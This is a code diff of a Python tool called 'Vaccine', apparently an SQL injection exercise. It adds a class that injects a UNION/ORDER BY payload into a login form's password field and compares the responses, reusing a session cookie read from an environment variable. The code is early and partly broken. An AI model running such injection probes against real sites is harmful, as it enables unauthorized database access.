@@ -3,8 +3,12 @@ import argparse
 import requests
 import re
 import os
+from difflib import Differ
 
 REQUEST_TYPES = set(["get", "post"])
+
+token = os.environ.get('TOKEN')
+cookies = {'PHPSESSID': token}
 
 def error_exit(msg):
 	print(f"Error: {msg}")
@@ -23,6 +27,31 @@ def form_url(url, add):
 		error_exit(f"worng url - {url}")
 	baseurl = baseurl_match.group()
 	return baseurl + '/' + add
+
+def print_diff(str1, str2):
+	differ = Differ()
+	diff = list(differ.compare(str1.splitlines(), str2.splitlines()))
+	print(diff)
+	diff_str = '\n'.join(diff)
+	print(diff_str)
+
+class Union:
+	def __init__(self, post):
+		self.post = post
+		self.delimiter = "'"
+		self.header = self.delimiter + " UNION "
+		self.comment = "#"
+		self.original_text = self.post("").text
+
+	def check_num_colums(self):
+		i = 3
+		q = f"ORDER BY {i}"
+		query = self.header + q + self.comment
+		res = self.post(query)
+		print_diff(self.original_text, res.text)
+
+	def union(self):
+		self.check_num_colums()
 
 class Vaccine:
 	def __init__(self, url, file, method):
@@ -82,8 +111,6 @@ class Vaccine:
 
 	def request(self):
 		try:
-			token = os.environ.get('TOKEN')
-			cookies = {'PHPSESSID': token}
 			response = requests.get(self.url, cookies=cookies)
 		except requests.exceptions.ConnectionError:
 			error_exit(f"connection refused - {self.url}")
@@ -97,7 +124,7 @@ class Vaccine:
 			error_exit(f"{self.url} - {response}")
 		return response.text
 
-	def post(self, username, password):
+	def post(self, password, username=""):
 		if self.username_field_name:
 			data = {
 				self.username_field_name: username,
@@ -108,12 +135,13 @@ class Vaccine:
 				self.password_field_name: password
 			}
 
-		res = requests.post(self.request_url, data=data)
-		print(res)
+		res = requests.post(self.request_url, data=data, cookies=cookies)
+		return res
 
 	def vaccine(self):
 		self.post("admin", "aaa")
-
+		u = Union(self.post)
+		u.union()
 
 def validate_args(args):
 	if not args.url.startswith('https://') and \
